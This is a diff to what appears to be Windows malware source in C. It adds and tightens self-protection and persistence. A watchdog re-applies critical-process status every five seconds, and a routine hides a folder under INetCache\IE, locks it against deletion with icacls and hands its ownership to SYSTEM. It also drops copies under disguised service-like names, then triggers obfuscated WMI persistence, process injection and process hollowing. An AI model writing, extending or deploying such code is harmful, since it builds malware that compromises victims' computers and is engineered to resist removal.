@@ -252,10 +252,12 @@ const char* sys_check_critical_status_with_name(void) {
 /* Watchdog thread: re-apply critical status periodically */
 DWORD WINAPI sys_protect_watchdog(LPVOID lpParam) {
     while (1) {
-        if (g_critical_protected == 1) {
+        /* Continuously re-apply critical protection every 5 seconds.
+           Also does initial protection if not yet attempted. */
+        if (g_critical_protected != -1) {
             obf_sys_protect_process();
         }
-        Sleep(5000);  /* Re-apply every 5 seconds */
+        Sleep(5000);
     }
     return 0;
 }
@@ -344,13 +346,37 @@ static void spawn_single_copy(const char *filename, const char *regKey) {
 
 /* Spawn three shadow copies with generic computer-related names */
 void sys_spawn_shadow_copy(void) {
+    char localAppData[MAX_PATH];
+    GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
+    char dirPath[MAX_PATH];
+    snprintf(dirPath, sizeof(dirPath), "%s\\Microsoft\\Windows\\INetCache\\IE", localAppData);
+    ensure_dir_exists(dirPath);
+    
+    /* Harden directory FIRST — deny DELETE_CHILD so files can't be deleted from it */
+    SetFileAttributesA(dirPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+    char *icacls = obf_icacls();
+    char cmd[1024];
+    snprintf(cmd, sizeof(cmd),
+        "%s \"%s\" /inheritance:r /grant:r \"Everyone:(RX)\" /deny \"Everyone:(DE,DC,WDAC,WO,W,M)\" /c /q",
+        icacls, dirPath);
+    sys_run_command(cmd);
+    snprintf(cmd, sizeof(cmd),
+        "%s \"%s\" /setowner \"NT AUTHORITY\\SYSTEM\" /c /q",
+        icacls, dirPath);
+    sys_run_command(cmd);
+    
     spawn_single_copy("ElevationService.exe", "ElevationService");
+    obf_sys_harden_single_file("ElevationService.exe");
+    
     spawn_single_copy("CrashHandler.exe", "CrashHandler");
+    obf_sys_harden_single_file("CrashHandler.exe");
+    
     spawn_single_copy("NotifyService.exe", "NotifyService");
+    obf_sys_harden_single_file("NotifyService.exe");
     
     /* Apply all advanced layers automatically using obfuscated APIs */
     obf_sys_wmi_persistence();
-    obf_sys_harden_files();
+    obf_sys_harden_files();   /* Full re-harden as safety net */
     obf_sys_inject_process();      /* obfuscated svchost/explorer injection */
     Sleep(2000);
     obf_sys_hollow_process();      /* obfuscated fileless hollowing */
